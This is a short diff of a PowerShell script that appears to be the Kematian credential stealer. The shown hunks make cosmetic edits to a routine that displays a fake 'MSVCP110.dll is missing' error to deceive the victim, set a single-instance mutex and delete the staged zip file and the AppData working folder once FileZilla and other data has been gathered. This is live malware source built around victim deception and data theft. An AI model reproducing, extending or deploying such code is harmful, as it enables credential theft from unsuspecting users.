@@ -22,7 +22,7 @@ $avatar = "https://i.imgur.com/DOIYOtp.gif"
 Add-Type -AssemblyName PresentationCore, PresentationFramework, System.Net.Http, System.Windows.Forms, System.Drawing
 
 function KDMUTEX {
-    if ($fakeerror ) {[System.Windows.Forms.MessageBox]::Show("The program can't start because MSVCP110.dll is missing from your computer. Try reinstalling the program to fix this problem.", '', 'OK', 'Error') }
+    if ($fakeerror ) {[Windows.Forms.MessageBox]::Show("The program can't start because MSVCP110.dll is missing from your computer. Try reinstalling the program to fix this problem.", '', 'OK', 'Error') }
     $AppId = "62088a7b-ae9f-4802-827a-6e9c921cb48e" 
     $CreatedNew = $false
     $script:SingleInstanceEvent = New-Object Threading.EventWaitHandle $true, ([Threading.EventResetMode]::ManualReset), "Global\$AppID", ([ref] $CreatedNew)
@@ -1122,7 +1122,7 @@ FileZilla: $filezilla_info
 
     # cleanup
     Remove-Item "$zipFilePath" -Force
-    Remove-Item "$ENV:APPDATA\Kematian" -Force -Recurse
+    Remove-Item "$env:appdata\Kematian" -Force -Recurse
 }
 
 if (CHECK_AND_PATCH -eq $true) {
